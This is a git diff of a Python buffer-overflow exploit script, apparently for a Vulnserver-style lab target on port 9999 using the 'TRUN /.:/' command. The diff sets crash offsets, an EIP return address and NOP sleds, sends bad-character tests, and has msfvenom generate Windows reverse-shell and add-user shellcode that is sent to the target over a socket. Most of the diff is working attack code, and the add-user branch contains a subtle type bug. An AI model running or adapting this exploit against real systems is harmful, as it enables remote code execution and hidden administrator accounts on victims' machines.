@@ -6,13 +6,13 @@ from colorama import Fore, Back, Style, init
 import codecs
 
 init(autoreset=True) # Colorama auto reset settings
-IP = ('192.168.1.108').encode('latin-1')
-CRASH = 900
-PORT = 4455
-EBP = 774
-EIP = 4
-NOPS = 0
-cmd = "OVRFLW"
+IP = ('192.168.0.110').encode('latin-1')
+CRASH = 3000 # Size of the total payload when EXE crashed
+PORT = 9999 # Remote Port where the EXE is listening
+EBP = 2003 # Total Size of the EBP
+EIP = "\xaf\x11\x50\x62" # EIP Size
+NOPS = 30 # Size of NOPS
+cmd = "TRUN /.:/" # Name oof the Vulnerable variable
 
 badcharlist = (
   "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
@@ -64,7 +64,7 @@ def sendPayload(buffer):
         s.connect((IP, PORT))
         s.send(bytes(payload,"latin-1"))
         s.recv(1024)
-        print(Fore.RED + "Payload Sent!")
+        print(Fore.GREEN + "Payload Sent!")
         s.close()
         
     except Exception as e:
@@ -84,7 +84,7 @@ def pattern_offset(offset):
 
 def send_badchars():
     print("Sending Badchars")
-    buffer = "\x41" * EBP + "\x42" * EIP + "\x90" * NOPS + badcharlist + "\x43" * ( CRASH - EBP - EIP - NOPS)
+    buffer = "\x41" * EBP + "\x42" * 4 + "\x90" * NOPS + badcharlist + "\x43" * ( CRASH - EBP - 4 - NOPS)
     sendPayload(str(buffer))
 
 def remove_badchars(badchar):
@@ -119,11 +119,16 @@ def remove_badchars(badchar):
         f.write(b)
         f.close()
     
-    buffer = "\x41" * EBP + "\x42" * EIP + "\x90" * NOPS + "".join(new_badchar) + "\x43" * ( CRASH - EBP - EIP - NOPS)
+    buffer = "\x41" * EBP + "\x42" * 4 + "\x90" * NOPS + "".join(new_badchar) + "\x43" * ( CRASH - EBP - 4 - NOPS)
 
     sendPayload(buffer)
 
 def shellcode():
+    if EIP == "":
+        print("Please set the EIP Location.")
+        print(Fore.RED + "Exiting...")
+        sys.exit()
+
     print('''
     1. Windows Reverse Shell TCP
     2. Windows Reverse Shell TCP x64
@@ -135,16 +140,41 @@ def shellcode():
         LHOST = input("Enter LHOST IP Address : ")
         LPORT = input("Enter LPORT Number : ")
         print("Generating shellcode")
+        with open('badchar.txt', 'r') as f:
+            bd = f.read()
+            bd = bd.replace(",","\\")
+            bd = bd[:-1]
         if choice == 1:
-            shellcode = subprocess.run(["msfvenom -p windows/shell_reverse_tcp LHOST=%s LPORT=%s -f c EXITFUNC=thread --platform windows" %LHOST%LPORT], shell=True, stdout=subprocess.PIPE)
+            shellcode = subprocess.run(["msfvenom -p windows/shell_reverse_tcp LHOST={} LPORT={} -b '{}' -f c EXITFUNC=thread --platform windows".format(LHOST,LPORT,bd) ], shell=True, stdout=subprocess.PIPE)
             shellcode = shellcode.stdout.decode('latin-1')
-            buffer = "\x41" * EBP + "\x42" * EIP + "\x90" * NOPS + str(shellcode) + "\x43" * ( CRASH - EBP - EIP - NOPS)
+            shellcode = shellcode.split("\n",1)[1]
+            shellcode = shellcode[:-2]
+            print("Shellcode : "+str(shellcode))
+            print("\n")
+            buffer = "\x41" * EBP + EIP + "\x90" * NOPS + str(shellcode) + "\x43" * ( CRASH - EBP - 4 - NOPS)
             sendPayload(buffer)
         if choice == 2:
-            shellcode = subprocess.run(["msfvenom -p windows/shell_reverse_tcp LHOST={} LPORT={} -f c EXITFUNC=thread --platform windows -a x64".format(LHOST,LPORT) ], shell=True, stdout=subprocess.PIPE)
+            #print("msfvenom -p windows/shell_reverse_tcp LHOST={} LPORT={} -b '{}' -f c EXITFUNC=thread --platform windows".format(LHOST,LPORT,bd))
+            shellcode = subprocess.run(["msfvenom -p windows/x64/shell_reverse_tcp LHOST={} LPORT={} -b '{}' -f c EXITFUNC=thread --platform windows".format(LHOST,LPORT,bd) ], shell=True, stdout=subprocess.PIPE)
             shellcode = shellcode.stdout.decode('latin-1')
-            buffer = "\x41" * EBP + "\x42" * EIP + "\x90" * NOPS + str(shellcode) + "\x43" * ( CRASH - EBP - EIP - NOPS)
+            shellcode = shellcode.split("\n",1)[1]
+            shellcode = shellcode[:-2]
+            print("Shellcode : "+str(shellcode))
+            buffer = "\x41" * EBP + EIP + "\x90" * NOPS + str(shellcode) + "\x43" * ( CRASH - EBP - 4 - NOPS)
             sendPayload(buffer)
+    if choice == 3:
+        # msfvenom -p windows/adduser -b "\x00\x04\xa4\xba\xef" -e x86/fnstenv_mov -f c
+        with open('badchar.txt', 'r') as f:
+            bd = f.read()
+            bd = bd.replace(",","\\")
+        command = "msfvenom -p windows/adduser -b '%s' -e x86/fnstenv_mov -f c" % bd[:-1]
+        shellcode = subprocess.run([command], shell=True, stdout=subprocess.PIPE)
+        shellcode = shellcode.stdout.decode('latin-1')
+        shellcode = shellcode.split("\n",1)[1]
+        shellcode = shellcode[:-2]
+        print("Shellcode : "+str(shellcode))
+        buffer = "\x41" * EBP + "\x42" * EIP + "\x90" * NOPS + str(shellcode) + "\x43" * ( CRASH - EBP - 4 - NOPS)
+        sendPayload(buffer)
 
 if __name__ == '__main__':
 
